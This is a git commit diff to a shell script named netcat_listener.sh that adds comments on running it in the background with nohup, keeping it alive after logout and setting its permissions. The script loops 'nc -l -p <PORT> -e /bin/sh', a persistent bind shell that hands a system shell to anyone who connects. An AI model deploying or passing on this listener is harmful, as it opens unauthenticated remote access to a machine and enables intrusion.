3f7a9ef3f7d9c2f0ec68271c1d361e5f25519dac
Scott Hardy <sky6uy@pm.me>
2021-02-19 14:50:42 -0700

    Added instructions as comments

--- linux/netcat_listener.sh
+++ linux/netcat_listener.sh
@@ -1,2 +1,5 @@
 #!/bin/bash
+# Execute: 'nohup netcat_listener.sh &' to run in background 
+# and remain running after user logout
+# Set permissions to 555
 while [ 1 ]; nc -l -p <PORT> -e /bin/sh; done
